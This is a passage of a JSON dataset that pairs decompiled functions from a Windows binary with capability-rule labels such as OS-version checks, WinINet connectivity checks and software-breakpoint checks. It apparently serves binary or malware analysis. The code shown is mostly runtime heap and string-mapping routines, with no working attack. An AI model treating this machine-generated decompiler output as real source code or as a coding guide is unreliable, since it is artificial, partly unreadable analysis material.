0xfffffff7;\n                    }\n                    iVar3 = 0;\n                    ppiVar9 = var_24h;\n                    do {\n                        var_4h = NULL;\n                        var_30h = ppiVar9 + 2;\n                        ppiVar4 = ppiVar9[1];\n                        var_2ch = ppiVar9;\n                        ppiVar10 = var_30h;\n                        if (ppiVar4 != ppiVar9) {\n                            do {\n                                if (var_4h == (&var_138h)[iVar3]) break;\n                                if ((ppiVar4 < var_8h) || (var_8h + 0x2000 <= ppiVar4)) {\n                                    return 0xfffffff6;\n                                }\n                                ppiVar7 = (ppiVar4 & 0xfffff000) + 0xc;\n                                ppiVar1 = (ppiVar4 & 0xfffff000) + 0xffc;\n                                if (ppiVar7 == ppiVar1) {\n                                    return 0xfffffff5;\n                                }\n                                do {\n                                    if (ppiVar7 == ppiVar4) break;\n                                    ppiVar7 = ppiVar7 + (*ppiVar7 & 0xfffffffe);\n                                    ppiVar10 = var_30h;\n                                } while (ppiVar7 != ppiVar1);\n                                if (ppiVar7 == ppiVar1) {\n                                    return 0xfffffff5;\n                                }\n                                iVar8 = (*ppiVar4 >> 4) + -1;\n                                if (0x3f < iVar8) {\n                                    iVar8 = 0x3f;\n                                }\n                                if (iVar8 != iVar3) {\n                                    return 0xfffffff4;\n                                }\n                                if (ppiVar4[2] != var_2ch) {\n                                    return 0xfffffff3;\n                                }\n                                var_4h = var_4h + 1;\n                                var_2ch = ppiVar4;\n                                ppiVar4 = ppiVar4[1];\n                            } while (ppiVar4 != ppiVar9);\n                            if (var_4h != NULL) {\n                                if (iVar3 < 0x20) {\n                                    uVar5 = 0x80000000 >> (iVar3 & 0x1f);\n                                    var_28h = var_28h | uVar5;\n                                    var_10h = var_10h | uVar5;\n                                }\n                                else {\n                                    uVar5 = 0x80000000 >> (iVar3 - 0x20 & 0x1f);\n                                    var_18h = var_18h | uVar5;\n                                    var_14h = var_14h | uVar5;\n                                }\n                            }\n                        }\n                        if ((var_2ch[1] != ppiVar9) || (var_4h != (&var_138h)[iVar3])) {\n                            return 0xfffffff2;\n                        }\n                        if (*ppiVar10 != var_2ch) {\n                            return 0xfffffff1;\n                        }\n                        iVar3 = iVar3 + 1;\n                        puVar11 = var_34h;\n                        puVar12 = var_38h;\n                        ppiVar9 = ppiVar10;\n                    } while (iVar3 < 0x40);\n                }\n                if ((var_28h != puVar12[-0x20]) || (var_18h != *puVar12)) {\n                    return 0xfffffff0;\n                }\n                var_8h = var_8h + 0x2000;\n                var_24h = var_24h + 0x81;\n                var_20h = var_20h << 1;\n                var_ch = var_ch + 1;\n                puVar12 = puVar12 + 1;\n            } while (var_ch < 0x20);\n            if ((var_10h != *puVar11) || (var_14h != puVar11[1])) {\n                return 0xffffffef;\n            }\n            puVar11 = puVar11 + 5;\n            var_1ch = var_1ch + 1;\n            var_38h = puVar12;\n        } while (var_1ch < *0x45e258);\n    }\n    return 0;\n}\n",
        "token_count": 2021
    },
    "00404f35": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00404f35(uint32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    bool bVar18;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar8 = arg_8h + 0x17U & 0xfffffff0;\n    iVar9 = (arg_8h + 0x17U >> 4) + -1;\n    puVar10 = *0x45e25c + *0x45e258 * 5;\n    uVar7 = iVar9;\n    if (iVar9 < 0x20) {\n        uVar16 = 0xffffffff >> (uVar7 & 0x1f);\n        var_8h = 0xffffffff;\n    }\n    else {\n        uVar16 = 0;\n        var_8h = 0xffffffff >> (uVar7 - 0x20 & 0x1f);\n    }\n    bVar18 = *0x45e264 < puVar10;\n    arg_8h = *0x45e264;\n    while ((bVar18 && ((arg_8h[1] & var_8h | *arg_8h & uVar16) == 0))) {\n        arg_8h = arg_8h + 5;\n        bVar18 = arg_8h < puVar10;\n    }\n    puVar14 = *0x45e25c;\n    if (arg_8h == puVar10) {\n        for (; (puVar14 < *0x45e264 && ((puVar14[1] & var_8h | *puVar14 & uVar16) == 0)); puVar14 = puVar14 + 5) {\n        }\n        arg_8h = puVar14;\n        if (puVar14 == *0x45e264) {\n            for (; (puVar14 < puVar10 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {\n            }\n            puVar15 = *0x45e25c;\n            arg_8h = puVar14;\n            if (puVar14 == puVar10) {\n                for (; (puVar15 < *0x45e264 && (puVar15[2] == 0)); puVar15 = puVar15 + 5) {\n                }\n                arg_8h = puVar15;\n                if ((puVar15 == *0x45e264) && (arg_8h = fcn.00404654(),  arg_8h == NULL)) {\n                    return NULL;\n                }\n            }\n            uVar6 = fcn.0040470b(arg_8h);\n            *arg_8h[4] = uVar6;\n            if (*arg_8h[4] == -1) {\n                return NULL;\n            }\n        }\n    }\n    piVar5 = arg_8h[4];\n    var_4h = *piVar5;\n    if ((var_4h == -1) || ((piVar5[var_4h + 0x31] & var_8h | piVar5[var_4h + 0x11] & uVar16) == 0)) {\n        var_4h = 0;\n        puVar10 = piVar5 + 0x11;\n        uVar12 = piVar5[0x31] & var_8h | *puVar10 & uVar16;\n        while (uVar12 == 0) {\n            puVar14 = puVar10 + 0x21;\n            var_4h = var_4h + 1;\n            puVar10 = puVar10 + 1;\n            uVar12 = *puVar14 & var_8h | *puVar10 & uVar16;\n        }\n    }\n    piVar3 = piVar5 + var_4h * 0x81 + 0x51;\n    iVar9 = 0;\n    uVar16 = piVar5[var_4h + 0x11] & uVar16;\n    if (uVar16 == 0) {\n        uVar16 = piVar5[var_4h + 0x31] & var_8h;\n        iVar9 = 0x20;\n    }\n    for (; -1 < uVar16; uVar16 = uVar16 << 1) {\n        iVar9 = iVar9 + 1;\n    }\n    piVar13 = piVar3[iVar9 * 2 + 1];\n    iVar11 = *piVar13 - uVar8;\n    iVar17 = (iVar11 >> 4) + -1;\n    if (0x3f < iVar17) {\n        iVar17 = 0x3f;\n    }\n    *0x45e264 = arg_8h;\n    if (iVar17 != iVar9) {\n        if (piVar13[1] == piVar13[2]) {\n            if (iVar9 < 0x20) {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 & 0x1f));\n                piVar5[var_4h + 0x11] = uVar16 & piVar5[var_4h + 0x11];\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    *arg_8h = *arg_8h & uVar16;\n                }\n            }\n            else {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 - 0x20 & 0x1f));\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] & uVar16;\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar16;\n                }\n            }\n        }\n        *(piVar13[2] + 4) = piVar13[1];\n        *(piVar13[1] + 8) = piVar13[2];\n        if (iVar11 == 0) goto code_r0x004051ee;\n        piVar1 = piVar3 + iVar17 * 2;\n        iVar9 = piVar1[1];\n        piVar13[2] = piVar1;\n        piVar13[1] = iVar9;\n        piVar1[1] = piVar13;\n        *(piVar13[1] + 8) = piVar13;\n        if (piVar13[1] == piVar13[2]) {\n            cVar4 = *(iVar17 + 4 + piVar5);\n            *(iVar17 + 4 + piVar5) = cVar4 + '\\x01';\n            uVar7 = iVar17;\n            if (iVar17 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar7 & 0x1f);\n                }\n                piVar5[var_4h + 0x11] = piVar5[var_4h + 0x11] | 0x80000000U >> (uVar7 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n                }\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n            }\n        }\n    }\n    if (iVar11 != 0) {\n        *piVar13 = iVar11;\n        *(iVar11 + -4 + piVar13) = iVar11;\n    }\ncode_r0x004051ee:\n    piVar13 = piVar13 + iVar11;\n    *piVar13 = uVar8 + 1;\n    *(piVar13 + (uVar8 - 4)) = uVar8 + 1;\n    iVar9 = *piVar3;\n    *piVar3 = iVar9 + 1;\n    if (((iVar9 == 0) && (arg_8h == *0x45e254)) && (var_4h == *0x45e26c)) {\n        *0x45e254 = NULL;\n    }\n    *piVar5 = var_4h;\n    return piVar13 + 1;\n}\n",
        "token_count": 2099
    },
    "00405276": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00405276(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t iStack16;\n    \n    iStack16 = param_1;\n    uStack24 = 0x405254;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    while( true ) {\n        iVar1 = *(param_1 + 8);\n        iVar2 = *(param_1 + 0xc);\n        if ((iVar2 == -1) || (iVar2 == param_2)) break;\n        uStack20 = *(iVar1 + iVar2 * 0xc);\n        *(param_1 + 0xc) = uStack20;\n        if (*(iVar1 + 4 + iVar2 * 0xc) == 0) {\n            fcn.0040530a(0x101);\n            (**(iVar1 + 8 + iVar2 * 0xc))();\n        }\n    }\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 263
    },
    "00405322": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405322(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar4 = arg_8h;\n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedExchange;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(*(in_FS_OFFSET + 0x18) + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(*(in_FS_OFFSET + 0x18) + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 != 0xffffffff) && (uVar10 <= *puVar5)) {\n            return 0;\n        }\n        if (puVar5[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar5 = puVar5 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar4[-2],  puVar1 < var_4h || (puVar4 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar12 = 0;\n    if (0 < *0x45e1d0) {\n        do {\n            if (*(iVar12 * 4 + 0x45e1d8) == uVar10) {\n                if (iVar12 < 1) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x45e218, 1);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                if (*(iVar12 * 4 + 0x45e1d8) == uVar10) goto code_r0x0040551d;\n                iVar12 = *0x45e1d0 + -1;\n                if (iVar12 < 0) goto code_r0x0040550b;\n                goto code_r0x004054fb;\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < *0x45e1d0);\n    }\n    iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(puVar8, &lpBuffer, 0x1c);\n    if (iVar12 == 0) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar6 = *(var_1ch + 0x1e) + var_1ch,  *piVar6 != 0x4550)) ||\n           (*(piVar6 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar6 + 5);\n        if (*(piVar6 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar6 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar6 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar6 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x45e218, 1);\n    iVar12 = *0x45e1d0;\n    if (iVar7 != 0) {\n        return 1;\n    }\n    iVar7 = *0x45e1d0;\n    if (0 < *0x45e1d0) {\n        puVar8 = *0x45e1d0 * 4 + 0x45e1d4;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar7 = iVar7 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar7);\n    }\n    if (iVar7 == 0) {\n        iVar7 = 0xf;\n        if (*0x45e1d0 < 0x10) {\n            iVar7 = *0x45e1d0;\n        }\n        iVar11 = 0;\n        if (-1 < iVar7) {\n            do {\n                puVar8 = iVar11 * 4 + 0x45e1d8;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar7);\n        }\n        if (iVar12 < 0x10) {\n            *0x45e1d0 = iVar12 + 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x45e218, 0);\n    return 1;\n    while (iVar12 = iVar12 + -1,  -1 < iVar12) {\ncode_r0x004054fb:\n        if (*(iVar12 * 4 + 0x45e1d8) == uVar10) break;\n    }\n    if (iVar12 < 0) {\ncode_r0x0040550b:\n        if (*0x45e1d0 < 0x10) {\n            *0x45e1d0 = *0x45e1d0 + 1;\n        }\n        iVar12 = *0x45e1d0 + -1;\n    }\n    else if (iVar12 == 0) goto code_r0x00405535;\ncode_r0x0040551d:\n    iVar7 = 0;\n    if (-1 < iVar12) {\n        do {\n            puVar8 = iVar7 * 4 + 0x45e1d8;\n            uVar9 = *puVar8;\n            iVar7 = iVar7 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar7 <= iVar12);\n    }\ncode_r0x00405535:\n    (*pcVar3)(0x45e218, 0);\n    return 1;\n}\n",
        "token_count": 1676
    },
    "0040554b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t fcn.0040554b(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (param_1 == 0) {\n        iVar1 = fcn.004042a2(param_2);\n    }\n    else {\n        if (param_2 == 0) {\n            fcn.004041f8(param_1);\n        }\n        else if (*0x45e4a4 == 3) {\n            do {\n                iVar1 = 0;\n                if (param_2 < 0xffffffe1) {\n                    arg_8h = fcn.00404311(param_1);\n                    if (arg_8h == 0) {\ncode_r0x00405633:\n                        if (param_2 == 0) {\n                            param_2 = 1;\n                        }\n                        param_2 = param_2 + 0xf & 0xfffffff0;\n                        iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x45e4a0, 0, param_1, param_2);\n                    }\n                    else {\n                        if (*0x45e260 < param_2) {\ncode_r0x004055f3:\n                            if (param_2 == 0) {\n                                param_2 = 1;\n                            }\n                            param_2 = param_2 + 0xf & 0xfffffff0;\n                            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x45e4a0, 0, param_2);\n                            if (iVar1 != 0) {\n                                uVar3 = *(param_1 + -4) - 1;\n                                if (param_2 <= uVar3) {\n                                    uVar3 = param_2;\n                                }\n                                fcn.00402390(iVar1, param_1, uVar3);\n                                fcn.0040433c(arg_8h, param_1);\n                            }\n                        }\n                        else {\n                            iVar2 = fcn.00404811(arg_8h, param_1, param_2);\n                            iVar1 = param_1;\n                            if (iVar2 == 0) {\n                                iVar1 = fcn.00404f35(param_2);\n                                if (iVar1 == 0) goto code_r0x004055f3;\n                                uVar3 = *(param_1 + -4) - 1;\n                                if (param_2 <= uVar3) {\n                                    uVar3 = param_2;\n                                }\n                                fcn.00402390(iVar1, param_1, uVar3);\n                                arg_8h = fcn.00404311(param_1);\n                                fcn.0040433c(arg_8h, param_1);\n                            }\n                            if (iVar1 == 0) goto code_r0x004055f3;\n                        }\n                        if (arg_8h == 0) goto code_r0x00405633;\n                    }\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                }\n                if (*0x45e24c == 0) {\n                    return iVar1;\n                }\n                iVar1 = fcn.00405e63(param_2);\n            } while (iVar1 != 0);\n        }\n        else {\n            do {\n                iVar1 = 0;\n                if (param_2 < 0xffffffe1) {\n                    if (param_2 == 0) {\n                        param_2 = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x45e4a0, 0, param_1, param_2);\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                }\n                if (*0x45e24c == 0) {\n                    return iVar1;\n                }\n                iVar1 = fcn.00405e63(param_2);\n            } while (iVar1 != 0);\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 903
    },
    "004056ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t fcn.004056ad(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if ((*0x45e4a4 == 3) && (iVar1 = fcn.00404311(param_1),  iVar1 != 0)) {\n        return *(param_1 + -4) + -9;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_HeapSize)(*0x45e4a0, 0, param_1);\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "004058d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_38h_2\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: lpSrcStr\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.004058d7(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint CodePage, uint arg_24h, uint arg_8h, \n            uint arg_ch, uint arg_10h, uint cchSrc, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *lpMultiByteStr_00;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    uint var_48h;\n    uint var_24h_2;\n    uint var_40h;\n    uint lpWideCharStr;\n    uint lpDestStr;\n    uint cchDest;\n    uint var_20h_2;\n    uint var_24h_3;\n    uint var_28h;\n    uint var_24h;\n    uint Locale;\n    uint dwMapFlags;\n    uint lpMultiByteStr;\n    uint cbMultiByte;\n    uint var_18h_2;\n    uint var_4h;\n    uint uVar5;\n    uint uVar6;\n    uint var_38h_2;\n    uint var_34h;\n    uint var_30h_2;\n    uint var_20h;\n    uint lpSrcStr;\n    uint var_44h;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h;\n    \n    fcn.00403650();\n    if (*0x45e240 == 0) {\n        lpSrcStr = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x45e240 = 2;\n            }\n        }\n        else {\n            *0x45e240 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        iVar1 = *(unaff_EBP + 0x14);\n        pcVar2 = *(unaff_EBP + 0x10);\n        do {\n            iVar1 = iVar1 + -1;\n            if (*pcVar2 == '\\0') goto code_r0x0040593d;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar1 != 0);\n        iVar1 = -1;\ncode_r0x0040593d:\n        *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + (-1 - iVar1);\n    }\n    if ((*0x45e240 != 2) && (*0x45e240 != 0)) {\n        if (*0x45e240 != 1) goto code_r0x00405c8a;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        if (*(unaff_EBP + 0x20) == 0) {\n            *(unaff_EBP + 0x20) = *0x45e238;\n        }\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x30) = iVar1;\n        if (iVar1 == 0) goto code_r0x00405c8a;\n        *(unaff_EBP + -4) = 1;\n        fcn.004037b0();\n        *(unaff_EBP + -0x18) = &fcn.004058d7::lpSrcStr;\n        *(unaff_EBP + -0x1c) = &fcn.004058d7::lpSrcStr;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x1c) == 0) {\n            iVar3 = fcn.004042a2();\n            *(unaff_EBP + -0x1c) = iVar3;\n            if (iVar3 == 0) goto code_r0x00405c8a;\n            *(unaff_EBP + -0x38) = 1;\n        }\n        var_30h_2 = 1;\n        var_34h = *(unaff_EBP + 0x20);\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, 0, 0);\n            *(unaff_EBP + -0x2c) = iVar3;\n            if (iVar3 != 0) {\n                if ((*(unaff_EBP + 0xd) & 4) == 0) {\n                    *(unaff_EBP + -4) = 2;\n                    fcn.004037b0();\n                    *(unaff_EBP + -0x18) = &fcn.004058d7::var_34h;\n                    *(unaff_EBP + -0x20) = &fcn.004058d7::var_34h;\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        iVar4 = fcn.004042a2(iVar3 * 2);\n                        *(unaff_EBP + -0x20) = iVar4;\n                        if (iVar4 == 0) goto code_r0x00405b0c;\n                        *(unaff_EBP + -0x34) = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                                      (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, \n                                       *(unaff_EBP + -0x20), iVar3);\n                    if (iVar1 != 0) {\n                        if (*(unaff_EBP + 0x1c) == 0) {\n                            uVar6 = 0;\n                            uVar5 = 0;\n                        }\n                        else {\n                            uVar6 = *(unaff_EBP + 0x1c);\n                            uVar5 = *(unaff_EBP + 0x18);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x20), 0, *(unaff_EBP + -0x20), iVar3, uVar5, uVar6, 0, 0);\n                    }\n                }\n                else if ((*(unaff_EBP + 0x1c) != 0) && (iVar3 <= *(unaff_EBP + 0x1c))) {\n                    (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, *(unaff_EBP + 0x18), \n                               *(unaff_EBP + 0x1c));\n                }\n            }\n        }\ncode_r0x00405b0c:\n        if (*(unaff_EBP + -0x34) != 0) {\n            fcn.004041f8(*(unaff_EBP + -0x20));\n        }\n        if (*(unaff_EBP + -0x38) != 0) {\n            fcn.004041f8(*(unaff_EBP + -0x1c));\n        }\n        goto code_r0x00405c8a;\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x3c) = 0;\n    if (*(unaff_EBP + 8) == 0) {\n        *(unaff_EBP + 8) = *0x45e228;\n    }\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x45e238;\n    }\n    iVar1 = fcn.00406220(*(unaff_EBP + 8));\n    *(unaff_EBP + -0x40) = iVar1;\n    if (iVar1 == -1) goto code_r0x00405c8a;\n    if (iVar1 == *(unaff_EBP + 0x20)) {\n        lpSrcStr = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n    }\n    else {\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = fcn.00406263(lpSrcStr, iVar1, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x407cc8, 0x38);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) goto code_r0x00405c8a;\n        uVar6 = *(unaff_EBP + 0xc);\n        lpSrcStr = *(unaff_EBP + 8);\n        lpMultiByteStr_00 = &fcn.004058d7::lpSrcStr;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n        *(unaff_EBP + -0x24) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.004037b0();\n            *(unaff_EBP + -0x18) = &fcn.004058d7::lpSrcStr;\n            *(unaff_EBP + -0x44) = &fcn.004058d7::lpSrcStr;\n            fcn.004061c0();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                lpMultiByteStr_00 = fcn.004042a2();\n                if (lpMultiByteStr_00 == NULL) goto code_r0x00405c52;\n                fcn.004061c0();\n                *(unaff_EBP + -0x3c) = 1;\n            }\n            var_30h_2 = *(unaff_EBP + 0xc);\n            var_34h = *(unaff_EBP + 8);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n            *(unaff_EBP + -0x24) = iVar1;\n            if (iVar1 != 0) {\n                var_30h_2 = *(unaff_EBP + 0x20);\n                var_34h = *(unaff_EBP + -0x40);\n                fcn.00406263(var_34h, var_30h_2, lpMultiByteStr_00, unaff_EBP + -0x24, *(unaff_EBP + 0x18), \n                             *(unaff_EBP + 0x1c), lpSrcStr, uVar6);\n            }\n        }\ncode_r0x00405c52:\n        if (*(unaff_EBP + -0x3c) != 0) {\n            fcn.004041f8();\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.004041f8();\n    }\ncode_r0x00405c8a:\n    *(unaff_EBP + -0x58) = 0x405c92;\n    fcn.0040368b();\n    return;\n}\n",
        "token_count": 2961
    },
    "00405c93": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: lpCharType\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.00405c93(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h_2, \n            uint noname_7, uint arg_8h, uint lpMultiByteStr, uint cbMultiByte, uint arg_14h, uint CodePage, uint arg_1ch\n            , uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t noname_1_00;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    int32_t 